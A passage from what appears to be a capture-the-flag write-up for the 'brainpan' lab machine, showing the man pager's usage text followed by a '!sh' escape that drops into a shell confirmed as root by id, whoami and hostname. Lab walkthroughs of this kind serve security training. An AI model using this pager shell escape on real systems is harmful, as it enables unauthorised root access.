       locale]  [-P  pager]  [-r  prompt]  [-7] [-E encoding] [-p string] [-t]
       [-T[device]] [-H[browser]] [-X[dpi]] [-Z] file ...
       man -w|-W [-C file] [-d] [-D] page ...
       man -c [-C file] [-d] [-D] page ...
       man [-hV]

DESCRIPTION
 Manual page man(1) line 1 (press h for help or q to quit)
       man is the system's manual pager. Each page argument given  to  man  is
 Manual page man(1) line 2 (press h for help or q to quit)
       normally  the  name of a program, utility or function.  The manual page
 Manual page man(1) line 5 (press h for help or q to quit)^[:!sh
!shnual page man(1) line 5 (press h for help or q to quit)
# id
id
uid=0(root) gid=0(root) groups=0(root)
# whoami
whoami
root
# hostname
hostname
brainpan
#
```

So I was able to gain root privileges without ever finding any password.
